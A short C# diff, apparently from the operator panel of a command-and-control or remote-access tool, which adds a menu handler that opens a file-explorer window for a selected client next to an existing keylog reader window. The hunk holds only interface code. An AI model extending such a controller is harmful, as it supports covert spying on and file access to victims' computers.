@@ -113,6 +113,12 @@ namespace CNC
             keylogReaderWindow.Show();
         }
 
+        private void fileManagerToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            FileExplorer fileExplorerWindow = new FileExplorer((Client)clientListView.FocusedItem.Tag);
+            fileExplorerWindow.Show();
+        }
+
         //Multi select BELOW
 
 
